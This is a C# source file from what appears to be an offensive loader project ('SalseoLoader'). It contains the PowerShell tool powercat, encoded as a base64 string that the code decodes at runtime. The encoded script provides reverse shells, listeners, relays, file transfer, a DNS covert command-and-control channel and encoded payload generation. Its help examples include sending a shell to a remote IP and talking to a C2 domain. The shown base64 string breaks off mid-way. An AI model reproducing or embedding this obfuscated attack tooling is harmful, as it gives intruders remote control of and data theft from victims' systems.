using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace SalseoLoader
{
    class powercat
    {
        public static string powercatbase64()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("ZnVuY3Rpb24gcG93ZXJjYXQNCnsNCiAgcGFyYW0oDQogICAgW2FsaWFzKCJDbGllbnQiKV1bc3RyaW5nXSRjPSIiLA0KICAgIFthbGlhcygiTGlzdGVuIildW3N3aXRjaF0kbD0kRmFsc2UsDQogICAgW2FsaWFzKCJQb3J0IildW1BhcmFtZXRlcihQb3NpdGlvbj0tMSldW3N0cmluZ10kcD0iIiwNCiAgICBbYWxpYXMoIkV4ZWN1dGUiKV1bc3RyaW5nXSRlPSIiLA0KICAgIFthbGlhcygiRXhlY3V0ZVBvd2Vyc2hlbGwiKV1bc3dpdGNoXSRlcD0kRmFsc2UsDQogICAgW2FsaWFzKCJSZWxheSIpXVtzdHJpbmddJHI9IiIsDQogICAgW2FsaWFzKCJVRFAiKV1bc3dpdGNoXSR1PSRGYWxzZSwNCiAgICBbYWxpYXMoImRuc2NhdDIiKV1bc3RyaW5nXSRkbnM9IiIsDQogICAgW2FsaWFzKCJETlNGYWlsdXJlVGhyZXNob2xkIildW2ludDMyXSRkbnNmdD0xMCwNCiAgICBbYWxpYXMoIlRpbWVvdXQiKV1baW50MzJdJHQ9NjAsDQogICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldW2FsaWFzKCJJbnB1dCIpXSRpPSRudWxsLA0KICAgIFtWYWxpZGF0ZVNldCgnSG9zdCcsICdCeXRlcycsICdTdHJpbmcnKV1bYWxpYXMoIk91dHB1dFR5cGUiKV1bc3RyaW5nXSRvPSJIb3N0IiwNCiAgICBbYWxpYXMoIk91dHB1dEZpbGUiKV1bc3RyaW5nXSRvZj0iIiwNCiAgICBbYWxpYXMoIkRpc2Nvbm5lY3QiKV1bc3dpdGNoXSRkPSRGYWxzZSwNCiAgICBbYWxpYXMoIlJlcGVhdGVyIildW3N3aXRjaF0kcmVwPSRGYWxzZSwNCiAgICBbYWxpYXMoIkdlbmVyYXRlUGF5bG9hZCIpXVtzd2l0Y2hdJGc9JEZhbHNlLA0KICAgIFthbGlhcygiR2VuZXJhdGVFbmNvZGVkIildW3N3aXRjaF0kZ2U9JEZhbHNlLA0KICAgIFthbGlhcygiSGVscCIpXVtzd2l0Y2hdJGg9JEZhbHNlDQogICkNCiAgDQogICMjIyMjIyMjIyMjIyMjIyBIRUxQICMjIyMjIyMjIyMjIyMjIw0KICAkSGVscCA9ICINCnBvd2VyY2F0IC0gTmV0Y2F0LCBUaGUgUG93ZXJzaGVsbCBWZXJzaW9uDQpHaXRodWIgUmVwb3NpdG9yeTogaHR0cHM6Ly9naXRodWIuY29tL2Jlc2ltb3JoaW5vL3Bvd2VyY2F0DQoNClRoaXMgc2NyaXB0IGF0dGVtcHRzIHRvIGltcGxlbWVudCB0aGUgZmVhdHVyZXMgb2YgbmV0Y2F0IGluIGEgcG93ZXJzaGVsbA0Kc2NyaXB0LiBJdCBhbHNvIGNvbnRhaW5zIGV4dHJhIGZlYXR1cmVzIHN1Y2ggYXMgYnVpbHQtaW4gcmVsYXlzLCBleGVjdXRlDQpwb3dlcnNoZWxsLCBhbmQgYSBkbnNjYXQyIGNsaWVudC4NCg0KVXNhZ2U6IHBvd2VyY2F0IFstYyBvciAtbF0gWy1wIHBvcnRdIFtvcHRpb25zXQ0KDQogIC1jICA8aXA+ICAgICAgICBDbGllbnQgTW9kZS4gUHJvdmlkZSB0aGUgSVAgb2YgdGhlIHN5c3RlbSB5b3Ugd2lzaCB0byBjb25uZWN0IHRvLg0KICAgICAgICAgICAgICAgICAgSWYgeW91IGFyZSB1c2luZyAtZG5zLCBzcGVjaWZ5IHRoZSBETlMgU2VydmVyIHRvIHNlbmQgcXVlcmllcyB0by4NCiAgICAgICAgICAgIA0KICAtbCAgICAgICAgICAgICAgTGlzdGVuIE1vZGUuIFN0YXJ0IGEgbGlzdGVuZXIgb24gdGhlIHBvcnQgc3BlY2lmaWVkIGJ5IC1wLg0KICANCiAgLXAgIDxwb3J0PiAgICAgIFBvcnQuIFRoZSBwb3J0IHRvIGNvbm5lY3QgdG8sIG9yIHRoZSBwb3J0IHRvIGxpc3RlbiBvbi4NCiAgDQogIC1lICA8cHJvYz4gICAgICBFeGVjdXRlLiBTcGVjaWZ5IHRoZSBuYW1lIG9mIHRoZSBwcm9jZXNzIHRvIHN0YXJ0Lg0KICANCiAgLWVwICAgICAgICAgICAgIEV4ZWN1dGUgUG93ZXJzaGVsbC4gU3RhcnQgYSBwc2V1ZG8gcG93ZXJzaGVsbCBzZXNzaW9uLiBZb3UgY2FuDQogICAgICAgICAgICAgICAgICBkZWNsYXJlIHZhcmlhYmxlcyBhbmQgZXhlY3V0ZSBjb21tYW5kcywgYnV0IGlmIHlvdSB0cnkgdG8gZW50ZXINCiAgICAgICAgICAgICAgICAgIGFub3RoZXIgc2hlbGwgKG5zbG9va3VwLCBuZXRzaCwgY21kLCBldGMuKSB0aGUgc2hlbGwgd2lsbCBoYW5nLg0KICAgICAgICAgICAgDQogIC1yICA8c3RyPiAgICAgICBSZWxheS4gVXNlZCBmb3IgcmVsYXlpbmcgbmV0d29yayB0cmFmZmljIGJldHdlZW4gdHdvIG5vZGVzLg0KICAgICAgICAgICAgICAgICAgQ2xpZW50IFJlbGF5IEZvcm1hdDogICAtciA8cHJvdG9jb2w+OjxpcCBhZGRyPjo8cG9ydD4NCiAgICAgICAgICAgICAgICAgIExpc3RlbmVyIFJlbGF5IEZvcm1hdDogLXIgPHByb3RvY29sPjo8cG9ydD4NCiAgICAgICAgICAgICAgICAgIEROU0NhdDIgUmVsYXkgRm9ybWF0OiAgLXIgZG5zOjxkbnMgc2VydmVyPjo8ZG5zIHBvcnQ+Ojxkb21haW4+DQogICAgICAgICAgICANCiAgLXUgICAgICAgICAgICAgIFVEUCBNb2RlLiBTZW5kIHRyYWZmaWMgb3ZlciBVRFAuIEJlY2F1c2UgaXQncyBVRFAsIHRoZSBjbGllbnQNCiAgICAgICAgICAgICAgICAgIG11c3Qgc2VuZCBkYXRhIGJlZm9yZSB0aGUgc2VydmVyIGNhbiByZXNwb25kLg0KICAgICAgICAgICAgDQogIC1kbnMgIDxkb21haW4+ICBETlMgTW9kZS4gU2VuZCB0cmFmZmljIG92ZXIgdGhlIGRuc2NhdDIgZG5zIGNvdmVydCBjaGFubmVsLg0KICAgICAgICAgICAgICAgICAgU3BlY2lmeSB0aGUgZG5zIHNlcnZlciB0byAtYywgdGhlIGRucyBwb3J0IHRvIC1wLCBhbmQgc3BlY2lmeSB0aGUgDQogICAgICAgICAgICAgICAgICBkb21haW4gdG8gdGhpcyBvcHRpb24sIC1kbnMuIFRoaXMgaXMgb25seSBhIGNsaWVudC4NCiAgICAgICAgICAgICAgICAgIEdldCB0aGUgc2VydmVyIGhlcmU6IGh0dHBzOi8vZ2l0aHViLmNvbS9pYWdveDg2L2Ruc2NhdDINCiAgICAgICAgICAgIA0KICAtZG5zZnQgPGludD4gICAgRE5TIEZhaWx1cmUgVGhyZXNob2xkLiBUaGlzIGlzIGhvdyBtYW55IGJhZCBwYWNrZXRzIHRoZSBjbGllbnQgY2FuDQogICAgICAgICAgICAgICAgICByZWNpZXZlIGJlZm9yZSBleGl0aW5nLiBTZXQgdG8gemVybyB3aGVuIHJlY2VpdmluZyBmaWxlcywgYW5kIHNldCBoaWdoDQogICAgICAgICAgICAgICAgICBmb3IgbW9yZSBzdGFiaWxpdHkgb3ZlciB0aGUgaW50ZXJuZXQuDQogICAgICAgICAgICANCiAgLXQgIDxpbnQ+ICAgICAgIFRpbWVvdXQuIFRoZSBudW1iZXIgb2Ygc2Vjb25kcyB0byB3YWl0IGJlZm9yZSBnaXZpbmcgdXAgb24gbGlzdGVuaW5nIG9yDQogICAgICAgICAgICAgICAgICBjb25uZWN0aW5nLiBEZWZhdWx0OiA2MA0KICAgICAgICAgICAgDQogIC1pICA8aW5wdXQ+ICAgICBJbnB1dC4gUHJvdmlkZSBkYXRhIHRvIGJlIHNlbnQgZG93biB0aGUgcGlwZSBhcyBzb29uIGFzIGEgY29ubmVjdGlvbiBpcw0KICAgICAgICAgICAgICAgICAgZXN0YWJsaXNoZWQuIFVzZWQgZm9yIG1vdmluZyBmaWxlcy4gWW91IGNhbiBwcm92aWRlIHRoZSBwYXRoIHRvIGEgZmlsZSwNCiAgICAgICAgICAgICAgICAgIGEgYnl0ZSBhcnJheSBvYmplY3QsIG9yIGEgc3RyaW5nLiBZb3UgY2FuIGFsc28gcGlwZSBhbnkgb2YgdGhvc2UgaW50bw0KICAgICAgICAgICAgICAgICAgcG93ZXJjYXQsIGxpa2UgJ2FhYWFhYScgfCBwb3dlcmNhdCAtYyAxMC4xLjEuMSAtcCA4MA0KICAgICAgICAgICAgDQogIC1vICA8dHlwZT4gICAgICBPdXRwdXQuIFNwZWNpZnkgaG93IHBvd2VyY2F0IHNob3VsZCByZXR1cm4gaW5mb3JtYXRpb24gdG8gdGhlIGNvbnNvbGUuDQogICAgICAgICAgICAgICAgICBWYWxpZCBvcHRpb25zIGFyZSAnQnl0ZXMnLCAnU3RyaW5nJywgb3IgJ0hvc3QnLiBEZWZhdWx0IGlzICdIb3N0Jy4NCiAgICAgICAgICAgIA0KICAtb2YgPHBhdGg+ICAgICAgT3V0cHV0IEZpbGUuICBTcGVjaWZ5IHRoZSBwYXRoIHRvIGEgZmlsZSB0byB3cml0ZSBvdXRwdXQgdG8uDQogICAgICAgICAgICANCiAgLWQgICAgICAgICAgICAgIERpc2Nvbm5lY3QuIHBvd2VyY2F0IHdpbGwgZGlzY29ubmVjdCBhZnRlciB0aGUgY29ubmVjdGlvbiBpcyBlc3RhYmxpc2hlZA0KICAgICAgICAgICAgICAgICAgYW5kIHRoZSBpbnB1dCBmcm9tIC1pIGlzIHNlbnQuIFVzZWQgZm9yIHNjYW5uaW5nLg0KICAgICAgICAgICAgDQogIC1yZXAgICAgICAgICAgICBSZXBlYXRlci4gcG93ZXJjYXQgd2lsbCBjb250aW51YWxseSByZXN0YXJ0IGFmdGVyIGl0IGlzIGRpc2Nvbm5lY3RlZC4NCiAgICAgICAgICAgICAgICAgIFVzZWQgZm9yIHNldHRpbmcgdXAgYSBwZXJzaXN0ZW50IHNlcnZlci4NCiAgICAgICAgICAgICAgICAgIA0KICAtZyAgICAgICAgICAgICAgR2VuZXJhdGUgUGF5bG9hZC4gIFJldHVybnMgYSBzY3JpcHQgYXMgYSBzdHJpbmcgd2hpY2ggd2lsbCBleGVjdXRlIHRoZQ0KICAgICAgICAgICAgICAgICAgcG93ZXJjYXQgd2l0aCB0aGUgb3B0aW9ucyB5b3UgaGF2ZSBzcGVjaWZpZWQuIC1pLCAtZCwgYW5kIC1yZXAgd2lsbCBub3QNCiAgICAgICAgICAgICAgICAgIGJlIGluY29ycG9yYXRlZC4NCiAgICAgICAgICAgICAgICAgIA0KICAtZ2UgICAgICAgICAgICAgR2VuZXJhdGUgRW5jb2RlZCBQYXlsb2FkLiBEb2VzIHRoZSBzYW1lIGFzIC1nLCBidXQgcmV0dXJucyBhIHN0cmluZyB3aGljaA0KICAgICAgICAgICAgICAgICAgY2FuIGJlIGV4ZWN1dGVkIGluIHRoaXMgd2F5OiBwb3dlcnNoZWxsIC1FIDxlbmNvZGVkIHN0cmluZz4NCg0KICAtaCAgICAgICAgICAgICAgUHJpbnQgdGhpcyBoZWxwIG1lc3NhZ2UuDQoNCkV4YW1wbGVzOg0KDQogIExpc3RlbiBvbiBwb3J0IDgwMDAgYW5kIHByaW50IHRoZSBvdXRwdXQgdG8gdGhlIGNvbnNvbGUuDQogICAgICBwb3dlcmNhdCAtbCAtcCA4MDAwDQogIA0KICBDb25uZWN0IHRvIDEwLjEuMS4xIHBvcnQgNDQzLCBzZW5kIGEgc2hlbGwsIGFuZCBlbmFibGUgdmVyYm9zaXR5Lg0KICAgICAgcG93ZXJjYXQgLWMgMTAuMS4xLjEgLXAgNDQzIC1lIGNtZCAtdg0KICANCiAgQ29ubmVjdCB0byB0aGUgZG5zY2F0MiBzZXJ2ZXIgb24gYzIuZXhhbXBsZS5jb20sIGFuZCBzZW5kIGRucyBxdWVyaWVzDQogIHRvIHRoZSBkbnMgc2VydmVyIG9uIDEwLjEuMS4xIHBvcnQgNTMuDQogICAgICBwb3dlcmNhdCAtYyAxMC4xLjEuMSAtcCA1MyAtZG5zIGMyLmV4YW1wbGUuY29tDQogIA0KICBTZW5kIGEgZmlsZSB0byAxMC4xLjEuMTUgcG9ydCA4MDAwLg0KICAgICAgcG93ZXJjYXQgLWMgMTAuMS4xLjE1IC1wIDgwMDAgLWkgQzpcaW5wdXRmaWxlDQogIA0KICBXcml0ZSB0aGUgZGF0YSBzZW50IHRvIHRoZSBsb2NhbCBsaXN0ZW5lciBvbiBwb3J0IDQ0NDQgdG8gQzpcb3V0ZmlsZQ0KICAgICAgcG93ZXJjYXQgLWwgLXAgNDQ0NCAtb2YgQzpcb3V0ZmlsZQ0KICANCiAgTGlzdGVuIG9uIHBvcnQgODAwMCBhbmQgcmVwZWF0ZWRseSBzZXJ2ZXIgYSBwb3dlcnNoZWxsIHNoZWxsLg0KICAgICAgcG93ZXJjYXQgLWwgLXAgODAwMCAtZXAgLXJlcA0KICANCiAgUmVsYXkgdHJhZmZpYyBjb21pbmcgaW4gb24gcG9ydCA4MDAwIG92ZXIgdGNwIHRvIHBvcnQgOTAwMCBvbiAxMC4xLjEuMSBvdmVyIHRjcC4NCiAgICAgIHBvd2VyY2F0IC1sIC1wIDgwMDAgLXIgdGNwOjEwLjEuMS4xOjkwMDANCiAgICAgIA0KICBSZWxheSB0cmFmZmljIGNvbWluZyBpbiBvbiBwb3J0IDgwMDAgb3ZlciB0Y3AgdG8gdGhlIGRuc2NhdDIgc2VydmVyIG9uIGMyLmV4YW1wbGUuY29tLA0KICBzZW5kaW5nIHF1ZXJpZXMgdG8gMTAuMS4xLjEgcG9ydCA1My4NCiAgICAgIHBvd2VyY2F0IC1sIC1wIDgwMDAgLXIgZG5zOjEwLjEuMS4xOjUzOmMyLmV4YW1wbGUuY29tDQoiDQogIGlmKCRoKXtyZXR1cm4gJEhlbHB9DQogICMjIyMjIyMjIyMjIyMjIyBIRUxQICMjIyMjIyMjIyMjIyMjIw0KICANCiAgIyMjIyMjIyMjIyMjIyMjIFZBTElEQVRFIEFSR1MgIyMjIyMjIyMjIyMjIyMjDQogICRnbG9iYWw6VmVyYm9zZSA9ICRWZXJib3NlDQogIGlmKCRvZiAtbmUgJycpeyRvID0gJ0J5dGVzJ30NCiAgaWYoJGRucyAtZXEgIiIpDQogIHsNCiAgICBpZigoKCRjIC1lcSAiIikgLWFuZCAoISRsKSkgLW9yICgoJGMgLW5lICIiKSAtYW5kICRsKSl7cmV0dXJuICJZb3UgbXVzdCBzZWxlY3QgZWl0aGVyIGNsaWVudCBtb2RlICgtYykgb3IgbGlzdGVuIG1vZGUgKC1sKS4ifQ0KICAgIGlmKCRwIC1lcSAiIil7cmV0dXJuICJQbGVhc2UgcHJvdmlkZSBhIHBvcnQgbnVtYmVyIHRvIC1wLiJ9DQogIH0NCiAgaWYoKCgoJHIgLW5lICIiKSAtYW5kICgkZSAtbmUgIiIpKSAtb3IgKCgkZSAtbmUgIiIpIC1hbmQgKCRlcCkpKSAtb3IgICgoJHIgLW5lICIiKSAtYW5kICgkZXApKSl7cmV0dXJuICJZb3UgY2FuIG9ubHkgcGljayBvbmUgb2YgdGhlc2U6IC1lLCAtZXAsIC1yIn0NCiAgaWYoKCRpIC1uZSAkbnVsbCkgLWFuZCAoKCRyIC1uZSAiIikgLW9yICgkZSAtbmUgIiIpKSl7cmV0dXJuICItaSBpcyBub3QgYXBwbGljYWJsZSBoZXJlLiJ9DQogIGlmKCRsKQ0KICB7DQogICAgJEZhaWx1cmUgPSAkRmFsc2UNCiAgICBuZXRzdGF0IC1uYSB8IFNlbGVjdC1TdHJpbmcgTElTVEVOSU5HIHwgJSB7aWYoKCRfLlRvU3RyaW5nKCkuc3BsaXQoIjoiKVsxXS5zcGxpdCgiICIpWzBdKSAtZXEgJHApe1dyaXRlLU91dHB1dCAoIlRoZSBzZWxlY3RlZCBwb3J0ICIgKyAkcCArICIgaXMgYWxyZWFkeSBpbiB1c2UuIikgOyAkRmFpbHVyZT0kVHJ1ZX19DQogICAgaWYoJEZhaWx1cmUpe2JyZWFrfQ0KICB9DQogIGlmKCRyIC1uZSAiIikNCiAgew0KICAgIGlmKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDIpDQogICAgew0KICAgICAgJEZhaWx1cmUgPSAkRmFsc2UNCiAgICAgIG5ldHN0YXQgLW5hIHwgU2VsZWN0LVN0cmluZyBMSVNURU5JTkcgfCAlIHtpZigoJF8uVG9TdHJpbmcoKS5zcGxpdCgiOiIpWzFdLnNwbGl0KCIgIilbMF0pIC1lcSAkci5zcGxpdCgiOiIpWzFdKXtXcml0ZS1PdXRwdXQgKCJUaGUgc2VsZWN0ZWQgcG9ydCAiICsgJHIuc3BsaXQoIjoiKVsxXSArICIgaXMgYWxyZWFkeSBpbiB1c2UuIikgOyAkRmFpbHVyZT0kVHJ1ZX19DQogICAgICBpZigkRmFpbHVyZSl7YnJlYWt9DQogICAgfQ0KICB9DQogICMjIyMjIyMjIyMjIyMjIyBWQUxJREFURSBBUkdTICMjIyMjIyMjIyMjIyMjIw0KICANCiAgIyMjIyMjIyMjIyMjIyMjIFVEUCBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjDQogIGZ1bmN0aW9uIFNldHVwX1VEUA0KICB7DQogICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpDQogICAgaWYoJGdsb2JhbDpWZXJib3NlKXskVmVyYm9zZSA9ICRUcnVlfQ0KICAgICRjLCRsLCRwLCR0ID0gJEZ1bmNTZXR1cFZhcnMNCiAgICAkRnVuY1ZhcnMgPSBAe30NCiAgICAkRnVuY1ZhcnNbIkVuY29kaW5nIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFzY2lpRW5jb2RpbmcNCiAgICBpZigkbCkNCiAgICB7DQogICAgICAkU29ja2V0RGVzdGluYXRpb25CdWZmZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gNjU1MzYNCiAgICAgICRFbmRQb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZFBvaW50IChbU3lzdGVtLk5ldC5JUEFkZHJlc3NdOjpBbnkpLCAkcA0KICAgICAgJEZ1bmNWYXJzWyJTb2NrZXQiXSA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlVEUENsaWVudCAkcA0KICAgICAgJFBhY2tldEluZm8gPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5JUFBhY2tldEluZm9ybWF0aW9uDQogICAgICBXcml0ZS1WZXJib3NlICgiTGlzdGVuaW5nIG9uIFswLjAuMC4wXSBwb3J0ICIgKyAkcCArICIgW3VkcF0iKQ0KICAgICAgJENvbm5lY3RIYW5kbGUgPSAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5CZWdpblJlY2VpdmVNZXNzYWdlRnJvbSgkU29ja2V0RGVzdGluYXRpb25CdWZmZXIsMCw2NTUzNixbU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldEZsYWdzXTo6Tm9uZSxbcmVmXSRFbmRQb2ludCwkbnVsbCwkbnVsbCkNCiAgICAgICRTdG9wd2F0Y2ggPSBbU3lzdGVtLkRpYWdub3N0aWNzLlN0b3B3YXRjaF06OlN0YXJ0TmV3KCkNCiAgICAgIHdoaWxlKCRUcnVlKQ0KICAgICAgew0KICAgICAgICBpZigkSG9zdC5VSS5SYXdVSS5LZXlBdmFpbGFibGUpDQogICAgICAgIHsNCiAgICAgICAgICBpZihAKDE3LDI3KSAtY29udGFpbnMgKCRIb3N0LlVJLlJhd1VJLlJlYWRLZXkoIk5vRWNobyxJbmNsdWRlS2V5RG93biIpLlZpcnR1YWxLZXlDb2RlKSkNCiAgICAgICAgICB7DQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJDVFJMIG9yIEVTQyBjYXVnaHQuIFN0b3BwaW5nIFVEUCBTZXR1cC4uLiINCiAgICAgICAgICAgICRGdW5jVmFyc1siU29ja2V0Il0uQ2xvc2UoKQ0KICAgICAgICAgICAgJFN0b3B3YXRjaC5TdG9wKCkNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGlmKCRTdG9wd2F0Y2guRWxhcHNlZC5Ub3RhbFNlY29uZHMgLWd0ICR0KQ0KICAgICAgICB7DQogICAgICAgICAgJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbG9zZSgpDQogICAgICAgICAgJFN0b3B3YXRjaC5TdG9wKCkNCiAgICAgICAgICBXcml0ZS1WZXJib3NlICJUaW1lb3V0ISIgOyBicmVhaw0KICAgICAgICB9DQogICAgICAgIGlmKCRDb25uZWN0SGFuZGxlLklzQ29tcGxldGVkKQ0KICAgICAgICB7DQogICAgICAgICAgJFNvY2tldEJ5dGVzUmVhZCA9ICRGdW5jVmFyc1siU29ja2V0Il0uQ2xpZW50LkVuZFJlY2VpdmVNZXNzYWdlRnJvbSgkQ29ubmVjdEhhbmRsZSxbcmVmXShbU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldEZsYWdzXTo6Tm9uZSksW3JlZl0kRW5kUG9pbnQsW3JlZl0kUGFja2V0SW5mbykNCiAgICAgICAgICBXcml0ZS1WZXJib3NlICgiQ29ubmVjdGlvbiBmcm9tIFsiICsgJEVuZFBvaW50LkFkZHJlc3MuSVBBZGRyZXNzVG9TdHJpbmcgKyAiXSBwb3J0ICIgKyAkcCArICIgW3VkcF0gYWNjZXB0ZWQgKHNvdXJjZSBwb3J0ICIgKyAkRW5kUG9pbnQuUG9ydCArICIpIikNCiAgICAgICAgICBpZigkU29ja2V0Qnl0ZXNSZWFkIC1ndCAwKXticmVha30NCiAgICAgICAgICBlbHNle2JyZWFrfQ0KICAgICAgICB9DQogICAgICB9DQogICAgICAkU3RvcHdhdGNoLlN0b3AoKQ0KICAgICAgJEZ1bmNWYXJzWyJJbml0aWFsQ29ubmVjdGlvbkJ5dGVzIl0gPSAkU29ja2V0RGVzdGluYXRpb25CdWZmZXJbMC4uKFtpbnRdJFNvY2tldEJ5dGVzUmVhZC0xKV0NCiAgICB9DQogICAgZWxzZQ0KICAgIHsNCiAgICAgIGlmKCEkYy5Db250YWlucygiLiIpKQ0KICAgICAgew0KICAgICAgICAkSVBMaXN0ID0gQCgpDQogICAgICAgIFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3RBZGRyZXNzZXMoJGMpIHwgV2hlcmUtT2JqZWN0IHskXy5BZGRyZXNzRmFtaWx5IC1lcSAiSW50ZXJOZXR3b3JrIn0gfCAleyRJUExpc3QgKz0gJF8uSVBBZGRyZXNzVG9TdHJpbmd9DQogICAgICAgIFdyaXRlLVZlcmJvc2UgKCJOYW1lICIgKyAkYyArICIgcmVzb2x2ZWQgdG8gYWRkcmVzcyAiICsgJElQTGlzdFswXSkNCiAgICAgICAgJEVuZFBvaW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LklQRW5kUG9pbnQgKFtTeXN0ZW0uTmV0LklQQWRkcmVzc106OlBhcnNlKCRJUExpc3RbMF0pKSwgJHANCiAgICAgIH0NCiAgICAgIGVsc2UNCiAgICAgIHsNCiAgICAgICAgJEVuZFBvaW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LklQRW5kUG9pbnQgKFtTeXN0ZW0uTmV0LklQQWRkcmVzc106OlBhcnNlKCRjKSksICRwDQogICAgICB9DQogICAgICAkRnVuY1ZhcnNbIlNvY2tldCJdID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVURQQ2xpZW50DQogICAgICAkRnVuY1ZhcnNbIlNvY2tldCJdLkNvbm5lY3QoJGMsJHApDQogICAgICBXcml0ZS1WZXJib3NlICgiU2VuZGluZyBVRFAgdHJhZmZpYyB0byAiICsgJGMgKyAiIHBvcnQgIiArICRwICsgIi4uLiIpDQogICAgICBXcml0ZS1WZXJib3NlICgiVURQOiBNYWtlIHN1cmUgdG8gc2VuZCBzb21lIGRhdGEgc28gdGhlIHNlcnZlciBjYW4gbm90aWNlIHlvdSEiKQ0KICAgIH0NCiAgICAkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSA9IDY1NTM2DQogICAgJEZ1bmNWYXJzWyJFbmRQb2ludCJdID0gJEVuZFBvaW50DQogICAgJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdDQogICAgJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0gPSAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5CZWdpblJlY2VpdmVGcm9tKCRGdW5jVmFyc1siU3RyZWFtRGVzdGluYXRpb25CdWZmZXIiXSwwLCRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdLChbU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldEZsYWdzXTo6Tm9uZSksW3JlZl0kRnVuY1ZhcnNbIkVuZFBvaW50Il0sJG51bGwsJG51bGwpDQogICAgcmV0dXJuICRGdW5jVmFycw0KICB9DQogIGZ1bmN0aW9uIFJlYWREYXRhX1VEUA0KICB7DQogICAgcGFyYW0oJEZ1bmNWYXJzKQ0KICAgICREYXRhID0gJG51bGwNCiAgICBpZigkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXS5Jc0NvbXBsZXRlZCkNCiAgICB7DQogICAgICAkU3RyZWFtQnl0ZXNSZWFkID0gJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbGllbnQuRW5kUmVjZWl2ZUZyb20oJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0sW3JlZl0kRnVuY1ZhcnNbIkVuZFBvaW50Il0pDQogICAgICBpZigkU3RyZWFtQnl0ZXNSZWFkIC1lcSAwKXticmVha30NCiAgICAgICREYXRhID0gJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdWzAuLihbaW50XSRTdHJlYW1CeXRlc1JlYWQtMSldDQogICAgICAkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siU29ja2V0Il0uQ2xpZW50LkJlZ2luUmVjZWl2ZUZyb20oJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdLDAsJEZ1bmNWYXJzWyJCdWZmZXJTaXplIl0sKFtTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0RmxhZ3NdOjpOb25lKSxbcmVmXSRGdW5jVmFyc1siRW5kUG9pbnQiXSwkbnVsbCwkbnVsbCkNCiAgICB9DQogICAgcmV0dXJuICREYXRhLCRGdW5jVmFycw0KICB9DQogIGZ1bmN0aW9uIFdyaXRlRGF0YV9VRFANCiAgew0KICAgIHBhcmFtKCREYXRhLCRGdW5jVmFycykNCiAgICAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5TZW5kVG8oJERhdGEsJEZ1bmNWYXJzWyJFbmRQb2ludCJdKSB8IE91dC1OdWxsDQogICAgcmV0dXJuICRGdW5jVmFycw0KICB9DQogIGZ1bmN0aW9uIENsb3NlX1VEUA0KICB7DQogICAgcGFyYW0oJEZ1bmNWYXJzKQ0KICAgICRGdW5jVmFyc1siU29ja2V0Il0uQ2xvc2UoKQ0KICB9DQogICMjIyMjIyMjIyMjIyMjIyBVRFAgRlVOQ1RJT05TICMjIyMjIyMjIyMjIyMjIw0KICANCiAgIyMjIyMjIyMjIyMjIyMjIEROUyBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjDQogIGZ1bmN0aW9uIFNldHVwX0ROUw0KICB7DQogICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpDQogICAgaWYoJGdsb2JhbDpWZXJib3NlKXskVmVyYm9zZSA9ICRUcnVlfQ0KICAgIGZ1bmN0aW9uIENvbnZlcnRUby1IZXhBcnJheQ0KICAgIHsNCiAgICAgIHBhcmFtKCRTdHJpbmcpDQogICAgICAkSGV4ID0gQCgpDQogICAgICAkU3RyaW5nLlRvQ2hhckFycmF5KCkgfCAlIHsiezA6eH0iIC1mIFtieXRlXSRffSB8ICUge2lmKCRfLkxlbmd0aCAtZXEgMSl7IjAiICsgW3N0cmluZ10kX30gZWxzZXtbc3RyaW5nXSRffX0gfCAlIHskSGV4ICs9ICRffQ0KICAgICAgcmV0dXJuICRIZXgNCiAgICB9DQogICAgDQogICAgZnVuY3Rpb24gU2VuZFBhY2tldA0KICAgIHsNCiAgICAgIHBhcmFtKCRQYWNrZXQsJEROU1NlcnZlciwkRE5TUG9ydCkNCiAgICAgICRDb21tYW5kID0gKCJzZXQgdHlwZT1UWFRgbnNlcnZlciAkRE5TU2VydmVyYG5zZXQgcG9ydD0kRE5TUG9ydGBuc2V0IGRvbWFpbj0uY29tYG5zZXQgcmV0cnk9MWBuIiArICRQYWNrZXQgKyAiYG5leGl0IikNCiAgICAgICRyZXN1bHQgPSAoJENvbW1hbmQgfCBuc2xvb2t1cCAyPiYxIHwgT3V0LVN0cmluZykNCiAgICAgIGlmKCRyZXN1bHQuQ2